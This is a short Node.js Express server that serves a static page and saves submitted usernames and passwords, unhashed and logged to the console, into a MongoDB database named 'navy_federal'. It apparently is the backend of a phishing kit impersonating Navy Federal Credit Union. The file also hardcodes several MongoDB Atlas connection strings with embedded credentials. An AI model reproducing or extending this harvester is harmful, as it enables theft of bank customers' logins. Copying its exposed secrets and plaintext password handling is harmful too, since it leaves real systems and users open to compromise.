
const express = require('express');
const { MongoClient } = require('mongodb');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
// Serve static files from the 'public' directory
app.use(express.static('public'));

// MongoDB connection string
// const uri = "mongodb+srv://phindCode:phindCode@cluster0.kcfnncd.mongodb.net/navy_federal"
// const uri = process.env.MONGODB_CONNECT || "mongodb+srv://tylercrosson23:June23Csml.@navy-pjcjbaz.mongodb.net/navy_federal"
 const uri = "mongodb+srv://tylercrosson23:June23Csm1.@navy.pjcjbaz.mongodb.net/"
console.log(`MongoDB Connection URI: ${uri}`);

let client;

// Function to connect to MongoDB
async function connectDB() {
  if (client) return client;
  try {
    client = await MongoClient.connect(uri, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('Connected to MongoDB');
  } catch (error) {
    console.error('Failed to connect to MongoDB:', error);
    throw error; // Propagate error
  }
  return client;
}


// Route handler for the root path
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html'); // Adjust the path according to your file structure
});


// POST endpoint to handle form submissions
app.post('/submit-form', async (req, res) => {
  try {
    await connectDB();
    const db = client.db('navy_federal');
    const usersCollection = db.collection('users');

    const { username, password } = req.body;
    console.log('Received:', username, password);

    const result = await usersCollection.insertOne({ username, password });
    console.log('Insert Result:', result);

    res.status(200).send('Form data submitted successfully');
  } catch (error) {
    console.error('Error handling form submission:', error);
    res.status(500).send('An error occurred while submitting the form');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});